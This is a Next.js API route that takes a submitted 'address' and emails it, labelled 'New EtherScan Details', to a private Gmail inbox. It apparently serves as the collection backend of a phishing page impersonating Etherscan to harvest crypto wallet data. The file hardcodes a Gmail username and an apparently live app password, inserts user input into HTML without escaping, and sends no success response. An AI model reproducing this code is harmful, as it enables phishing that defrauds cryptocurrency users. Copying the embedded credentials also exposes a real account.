import { NextResponse, NextRequest } from "next/server";
import mailer from "nodemailer-promise";

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { address } = body;
    if (!address) {
      return NextResponse.json(
        { error: "Address is required" },
        { status: 400 }
      );
    }
    const sendMail = mailer.config({
      host: `smtp.gmail.com`,
      port: `465`,
      secure: true,
      auth: {
        user: `fretking24@gmail.com`,
        pass: `zjwm tqiv zlul riri`,
      },
    });
    sendMail({
      from: "random@fonu.com",
      to: "sokoyanifemi@gmail.com",
      subject: "New EtherScan Details",
      html: `
        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <body>
    <table cellspacing="0" width="100%">
      <tr>
        <td></td>
        <td width="800" style="padding: 2rem; background: #f2f2f2">
          <div
            style="background: white; text-align: center; padding: 3rem 2rem"
          >
            <h1
              style="
                font-weight: 500;
                font-size: 24px;
                line-height: 29.05px;
                margin-top: 2rem;
              "
            >
              Hello,
            </h1>
            <div
              style="
                font-weight: 400;
                font-size: 16px;
                line-height: 19.36px;
                margin-top: 2rem;
              "
            >
              <span style="font-size: 20px">
                New address submitted for etherscan: ${address}
              </span>
              <span style="font-size: 20px"> </span>
            </div>
          </div>
        </td>
        <td></td>
      </tr>
    </table>
  </body>
</html>
      `,
    });
  } catch (error) {
    return NextResponse.json(
      {
        error: `An error occurred while processing the request. Error: ${error}`,
      },
      { status: 500 }
    );
  }
}
